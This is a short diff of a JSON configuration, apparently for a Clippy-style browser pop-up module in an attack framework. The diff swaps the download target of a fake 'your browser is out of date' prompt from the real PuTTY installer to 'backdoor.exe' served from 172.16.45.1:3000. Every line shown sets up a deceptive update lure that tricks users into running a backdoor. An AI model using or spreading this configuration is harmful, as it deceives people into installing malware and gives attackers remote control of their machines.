@@ -19,7 +19,7 @@
       "options": {
         "clippydir": "http://clippy.ajbnet.com/1.0.0/",
         "askusertext": "Your browser appears to be out of date. Would you like to upgrade it?",
-        "executeyes": "http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe",
+        "executeyes": "http://172.16.45.1:3000/updates/backdoor.exe",
         "respawntime":"5000",
         "thankyoumessage":"Thanks for upgrading your browser! Look forward to a safer, faster web!"
       }
